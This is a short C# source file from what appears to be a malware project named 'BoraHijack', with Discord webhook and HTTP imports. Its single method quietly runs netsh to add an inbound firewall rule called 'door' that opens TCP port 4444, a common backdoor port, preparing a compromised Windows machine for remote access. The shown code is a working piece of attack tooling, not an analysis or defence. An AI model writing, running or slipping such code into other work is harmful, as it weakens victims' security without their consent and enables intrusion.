using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using Discord;
using Discord.Webhook;
using System.Net.Http;
using System.IO;


namespace BoraHijack.Lambda_Inject
{
    class Lambda : IListenerActivate
    {
        public void StartListen()
        {
            Process.Start("netsh", "advfirewall firewall add rule name=\"door\" dir=in action=allow protocol=TCP localport=4444"); // change port or not, idgaf. 
        }
    }
}
